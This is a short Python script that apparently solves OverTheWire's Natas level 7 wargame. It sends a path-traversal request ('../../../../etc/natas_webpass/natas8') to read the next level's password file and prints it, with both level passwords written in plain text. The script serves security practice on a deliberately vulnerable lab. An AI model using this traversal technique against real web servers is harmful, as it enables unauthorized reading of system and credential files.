#!/usr/bin/env python3

import requests
import re

username = 'natas7'
password = '7z3hEENjQtflzgnT29q7wAvMNfZdh0i9'

url = 'http://%s.natas.labs.overthewire.org' % username

url_secret = url + '?page=../../../../etc/natas_webpass/natas8'
response = requests.get(url_secret, auth=(username, password))
content = response.text

flag = re.findall('DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe', content)[0]

print(flag)